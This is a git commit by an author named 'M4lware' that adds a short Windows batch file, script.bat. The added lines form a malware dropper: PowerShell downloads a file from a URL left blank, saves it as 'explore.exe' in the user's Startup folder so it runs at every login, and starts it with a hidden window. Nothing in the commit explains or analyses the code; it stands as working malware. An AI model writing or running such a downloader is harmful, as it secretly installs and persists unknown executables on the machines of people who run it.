1b616281e2ff7c2aa3268aa9f42d1d48370d6307
M4lware <128651023+M4lware-01@users.noreply.github.com>
2023-09-08 23:06:25 +0400

    Update script.bat

--- script.bat
+++ script.bat
@@ -1,1 +1,7 @@
+@echo off
 
+set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
+set "DownloadURL="
+set "DestinationPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe"
+powershell -Command "Invoke-WebRequest -useb '%DownloadURL%' -o '%DestinationPath%'"
+powershell -Command "Start-Process '%DestinationPath%' -WindowStyle Hidden"
